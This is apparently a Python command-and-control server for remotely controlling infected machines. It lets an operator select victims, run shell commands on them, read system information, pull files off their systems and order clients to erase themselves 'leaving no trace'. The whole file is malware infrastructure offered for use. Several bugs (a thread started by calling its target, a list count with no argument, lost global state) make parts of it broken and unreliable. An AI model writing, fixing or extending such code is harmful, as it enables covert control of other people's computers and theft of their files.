#!/usr/bin/env python

import socket, select, sys
import threading, time
from random import randint
import datetime
from os import path

# Print color codes

W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple

# End Print color codes


MAX_CLIENTS = 99    # Change if you want to manage more clients
client_count = 1    # Variable used to keep track of the clients connected
client_id = -1  # To make sure there is no client selected. +
# List to keep track of socket descriptors
CONNECTION_LIST = []
RECV_BUFFER = 4096 # You're free to increase or decrease it as long as you keep it an exponent of 2
PORT = 5011

last_command = ""
remote_file = ""

def cmd_thread():
    while True :
        parse_command()

# Function to broadcast chat messages to all connected clients
def broadcast_data (sock, message):
    # Do not send the message to master socket and the client who has send us the message
    for socket in CONNECTION_LIST:
        if socket != server_socket and socket != sock :
            try :
                socket.send(message)
            except :
                # broken socket connection may be, chat client pressed ctrl+c for example
                socket.close()
                CONNECTION_LIST.remove(socket)

def display_help ():
    print(W)
    print("Help : shows all the commands ")
    print("sel [client id] : selects the client with the id")
    print("shell [command] : sends shell command to the client (the client must have been selected prior to this")
    print("getinfo : displays informations on the client's system (the client must have been select prior to this")
    print("getfile [/path/to/file] : get the file with the path on the client's side")
    #print("sendfile [/local/path/to/file] [/remote/path/to/file] : uploads the file to the client on the remote path provided")
    print("kill [client_id] : kills the client with the matching id")
    print("remove [client_id] : the client autoremoves itself and leaves no trace on the infected system")
    print("list : lists all connected clients")
    print("exit : Exist the server killing all the connexions (not removing clients)")
    print(W)

# this function parses the server's command
def parse_command():
    global client_id
    prompt()
    cmd = input()
    if cmd.upper() == "HELP" :
        display_help()
    elif cmd.upper() == "LIST" :
        list_clients()
    elif cmd.upper() == "EXIT":
        if input(R + "/!\ Are you sure you want to exit the C&C ? /!\ ? yes/no" + W).upper() == "YES":
            exit_all()
    else :
        # Parsing commands with arguments
        sub = cmd.split(" ")    # Split the command by the space caracter and parse it
        print(sub[1])
        if sub[0].upper() == "SEL" :
            if 0 < int(sub[1]) <= client_count :
                client_id = int(sub[1])
                print(G + "[+] Selected client id is now %d" % client_id + W)
            else :
                print(R + "[-] There is no client matching the id you've entered : %s" % sub[1] + W)
        elif sub[0].upper() == "GETINFO" :
            if client_id <= 0 :
                print(R + "[-] You need to select a client to use this command" + W)
            else :
                send_cmd(sub[0])    # send "getinfo" to the client and expect it's return
        elif sub[0].upper() == "SHELL" :
            if client_id <= 0 :
                print(R + "[-] You need to select a client to use this command" + W)
            else :
                send_cmd(cmd)    #send the command alone tho the client and expect the response
        elif sub[0].upper() == "KILL" :
            if client_id <= 0:
                print(R + "[-] You need to select a client to use this command" + W)
            else:
                send_cmd(sub[0])  # send "kill" to the client and expect the response
        elif sub[0].upper() == "REMOVE" :
            if client_id <= 0:
                print(R + "[-] You need to select a client to use this command" + W)
            else:
                send_cmd(sub[0])  # send "remove" to the client and expect the response
        elif sub[0].upper() == "GETFILE" :
            if client_id <= 0:
                print(R + "[-] You need to select a client to use this command" + W)
            else:
                send_cmd(cmd)  # send the entire command to the client and expect the response
                last_command = "getfile"
                remote_file = sub[2]

def exit_all() :
    global CONNECTION_LIST
    for sckt in CONNECTION_LIST :
        sckt.close()
    exit(0)

def prompt():
    if client_id <= 0:
        sys.stdout.write(">> Your command : ")
    else:
        sys.stdout.write("[ " + str(client_id) + " ] >> Your command : ")

    sys.stdout.flush()

def list_clients():
    global CONNECTION_LIST
    count = 1
    for sck in CONNECTION_LIST:
        print(G + "[+] Client Id :  " + str(count) + " --> at : (%s,%s)" % sck.getsockname() + W)

def send_cmd (command):
    # Do not send the message to master socket and the client who has send us the message
    global CONNECTION_LIST
    global client_count
    if 0 < client_id <= CONNECTION_LIST.count() :
        try:
            # The list's index is a zero based index
            CONNECTION_LIST[client_id - 1].send(command)
        except :
            # broken socket connection may be, chat client pressed ctrl+c for example
            CONNECTION_LIST[client_id - 1].close()
            CONNECTION_LIST.remove(CONNECTION_LIST[client_id - 1])
            client_count -= 1   # Decrement clients to ajust their IDs

if __name__ == "__main__":

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(("0.0.0.0", PORT))
    server_socket.listen(MAX_CLIENTS)

    # Add server socket to the list of readable connections
    CONNECTION_LIST.append(server_socket)

    print(G + "[+} C&C server started on local tcp port " + str(PORT) + W)
    print(G + "[+] Waiting from incomming connections..." + W)
    print(B + "[*] Please be aware that you can only manage " + str(MAX_CLIENTS) + " at a time" + W)

    threading.Thread(target=cmd_thread()).start()  # thread to read the commands

    while True:
        # parse_command()
        # Get the list sockets which are readable with 'select'
        read_sockets, write_sockets, error_sockets = select.select(CONNECTION_LIST, [], [])

        # print("new one")
        for sock in read_sockets:
            # new connection
            if sock == server_socket:
                # Handle the case in which there is a new connection recieved through server_socket
                sockfd, addr = server_socket.accept()
                print("debug")
                CONNECTION_LIST.append(sockfd)
                print("debug2")
                client_count += 1
                sys.stdout.write(B + "[*] Client (%s, %s) connected" % addr + W)
                sys.stdout.flush()
                print(B + "[*] Client at (%s, %s) has id : " % addr + str(client_count) + W)
                if 5 < MAX_CLIENTS - client_count < 10:
                    print(O + "[!] You can accept only 10 more clients or less" + W)
                else:
                    if 0 < MAX_CLIENTS - client_count < 5:
                        print(R + "[-] You have enough room to add " + str(MAX_CLIENTS - client_count) + W)
            # Some incoming message/data from a client
            else:
                # Process the data received from a client
                try:
                    # Eventually throws a "Connection reset by peer" exception
                    data = sock.recv(RECV_BUFFER)
                    if data:
                        if last_command == "":
                            print(G + "[+] Response >>> | " + data + W)
                        elif last_command == "getfile":
                            # write file receiving
                            new_file = "data/" + str(datetime.datetime.now().timestamp()) + remote_file
                            fp = open(new_file, "wb")
                            fp.write(data)
                            print(G + "[+] File downloaded at location : " + new_file + W)
                            last_command = ""
                except:
                    # broadcast_data(sock, "Client (%s, %s) is offline" % addr + W)
                    print(R + "[-] Client (%s, %s) is offline" % addr + W)
                    sock.close()
                    CONNECTION_LIST.remove(sock)
                    continue

    server_socket.close()